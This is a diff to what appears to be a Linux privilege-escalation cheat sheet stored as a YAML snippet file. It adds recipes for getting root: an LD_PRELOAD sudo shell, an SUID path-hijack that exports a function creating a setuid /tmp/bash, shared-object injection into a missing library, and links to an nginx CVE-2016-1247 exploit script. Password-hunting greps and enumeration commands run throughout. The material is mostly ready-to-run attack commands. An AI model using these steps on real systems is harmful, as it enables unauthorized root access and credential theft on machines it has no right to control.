@@ -23,6 +23,8 @@ functions:
         - [ ] /bin/lsblk
         - [ ] lsmod
         - [ ] sudo -V
+        - [ ] ls -al /etc/iptables/* -R
+        - [ ] ls -lah /etc/cron*        
 
         User Enum:
         - [ ] whoami
@@ -39,8 +41,11 @@ functions:
 
         Task Scheduling:
         - [ ] cat /etc/crontab
+        - [ ] systemctl list-timers --all
         - [ ] grep "CRON" /var/log/cron.log
-        - [ ] process momintoring (below script)
+        - [ ] process monitoring (below script)
+          https://github.com/unkn0wnsyst3m/scripts/blob/master/procmon.sh
+
 
         Password Hunting:
         - [ ] grep --color=auto -rnw '/' -ie "PASSWORD=" 2>/dev/null
@@ -53,19 +58,30 @@ functions:
           https://github.com/unkn0wnsyst3m/scripts/blob/master/shell_ldpreload.c
           gcc -fPIC -shared shell.c -o shell.so -nostartfiles
 
-          sudo LD_PRELOAD=/home/user/shell.so <SUDO BIN>
+          sudo LD_PRELOAD=/home/user/shell.so <BIN IN SUDO -l>
 
         SUID:
         - [ ] find / -perm -u=s -type f -ls 2>/dev/null
 
+        SUID CHILD PATH BINARY TAKEOVER:
+        strings /usr/local/bin/suid-env2
+            --> /usr/sbin/service apache2 start
+        function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s+x /tmp/bash && /tmp/bash -p; }
+        export -f /usr/sbin/service
+        execute - /usr/local/bin/suid-env2
+
+        CAPABILITIES:
+        - [ ] getcap -r / 2>/dev/null
+
         SHARED OBJECT INJECTION:
         - [ ] strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
-          https://github.com/unkn0wnsyst3m/scripts/blob/master/shell_ldpreload.c
-          gcc -fPIC -shared shell.c -o shell.so -nostartfiles
+            --> open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
+          https://github.com/unkn0wnsyst3m/scripts/blob/master/shell.c
+          gcc -fPIC -shared shell.c -o /home/user/.config/libcalc.so -nostartfiles
 
           run setuid_bin
 
-        File Permission Searching:
+        FILE PERMISSION SEARCHING:
         - [ ] find / -type f -perm -2 2>/dev/null | grep -v "^/proc/"                     #world writable
         - [ ] find / -user root -perm -002 -type f 2>/dev/null | grep -v "^/proc/"     #world writable ownd by root
         - [ ] ls -al $(find / -perm -1000 -type d 2>/dev/null)   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
@@ -75,20 +91,12 @@ functions:
         - [ ] find / -xdev -user root -perm -o+w -type f 2>/dev/null
         - [ ] find / -xdev -group admin -perm -o+w -type f 2>/dev/null
         
-        - [ ] ls -al /etc/iptables/* -R
-        - [ ] ls -lah /etc/cron*        
 
-        MONITOR PROCESSES:
-        ------------------
-        #!/bin/bash
-        IFS=$'\n'
-        old_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)
-        while true; do
-          new_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)
-          diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
-          sleep 1
-          old_process=$new_process
-        done
+        QUICK WINS:
+        - [ ] dpkg -l | grep nginx  # l.6.2 nginx (and earlier) and writable log dir with sudo suid CVE-2016-1247
+          https://github.com/unkn0wnsyst3m/scripts/blob/master/nginx-CVE-2016-1247.sh
+        - [ ] ps aux | grep mysqld  # running as root?
+          https://mfnttps.github.io/mfnttps/mysql-code_exec/
 
     - description: LinPeas
       code: |
